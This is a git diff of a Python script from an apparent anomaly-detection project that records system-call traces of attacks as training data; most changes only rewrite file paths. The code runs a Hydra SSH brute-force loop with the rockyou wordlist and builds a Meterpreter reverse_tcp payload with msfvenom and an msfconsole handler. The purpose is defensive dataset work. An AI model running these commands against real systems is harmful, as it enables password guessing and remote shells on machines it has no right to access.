@@ -12,6 +12,7 @@ import filecmp
 import random
 import pyautogui
 
+JSON_FILE = 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/syscalls.json'
 
 
 def get_my_ip():
@@ -82,12 +83,12 @@ def get_syscall_from_ssh():
     wordList = '/usr/share/wordlists/rockyou.txt'
     ip_list = ['10.10.10.15','10.10.10.16', '10.10.10.13', '10.10.10.14','10.10.10.12']  # Liste d'adresses IP différentes
     name_list = ['root', 'admin', 'user']  # Liste de noms d'utilisateur différents
-    syscall_names_file_base = 'syscall_names.txt'
+    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'
 
     for i in range(40):
         ip = random.choice(ip_list)  # Sélectionne une adresse IP aléatoire
         name = random.choice(name_list)  # Sélectionne un nom d'utilisateur aléatoire
-        output_file = 'output.txt'
+        output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'
 
         cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(
             output_file=output_file, name=name, wordList=wordList, ip=ip)
@@ -102,7 +103,7 @@ def get_syscall_from_ssh():
         process = subprocess.Popen(cmd2, shell=True)
         process.wait()
 
-        replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))
+        replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))
 
 def get_syscall_from_hydra_http(json_file):
     """ Get the syscall from the Hydra HTTP attack
@@ -111,8 +112,8 @@ def get_syscall_from_hydra_http(json_file):
         json_file (str): The path of the json file containing the data
     """
 
-    output_file = 'output.txt'
-    syscall_names_file_base = 'syscall_names.txt'
+    output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'
+    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'
 
     name_list = ['root', 'admin', 'user']
     name = random.choice(name_list)
@@ -128,16 +129,17 @@ def get_syscall_from_hydra_http(json_file):
     process = subprocess.Popen(cmd2, shell=True)
     process.wait()
 
-    replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_12/UAD-Hydra-SSH-1-0.txt')
+    replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-0.txt')
 
 
 
 def get_syscall_from_Meterpreter():
     """ Get the syscall from the Meterpreter attack
     """
-    syscall_names_file_base = 'syscall_names.txt'
-    payload = "meterpreterPayload"
+    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'
+    payload = "FireArmor-AI-Anomaly-Detection/meterpreterPayload"
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
+    output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'
 
     ip = get_my_ip()
     print('your ip:', ip)
@@ -146,7 +148,7 @@ def get_syscall_from_Meterpreter():
     cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
     cmd2 = "chmod +x {payload}".format(payload=payload)
     cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
-    cmd4 = "strace -e trace=all -o output.txt ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
+    cmd4 = "strace -e trace=all -o {output_file}  ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload,output_file=output_file)
 
     console1 = subprocess.Popen(['xterm', '-e', cmd1], shell=False)
     time.sleep(10)
@@ -165,12 +167,7 @@ def get_syscall_from_Meterpreter():
     console3.kill()
     console4.kill()
 
-
-
-
-
-
-    replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
+    replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
 
 
 def get_systemcall_from_your_computer(json_file):
@@ -202,10 +199,9 @@ def replace_syscall_with_number(input_file, output_file):
         input_file (str): The path of the file containing the syscall names
         output_file (str): The path of the file containing the syscall numbers
     """
-    json_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'
     
     # load syscall numbers from JSON
-    with open(json_file, 'r') as f:
+    with open(JSON_FILE, 'r') as f:
         syscalls = json.load(f)
 
 
@@ -222,11 +218,9 @@ def replace_syscall_with_number(input_file, output_file):
 
 
 if __name__ == "__main__":
-    json_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'
-    ssh_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/'
-    get_systemcall_from_your_computer(json_file)
+    ssh_file = 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/'
+    get_systemcall_from_your_computer(JSON_FILE)
     get_syscall_from_ssh()
     # get_syscall_from_Meterpreter()
     # get_syscall_from_hydra_http()
-    # get_syscall_from_Meterpreter()
     compare_and_delete_files(ssh_file)
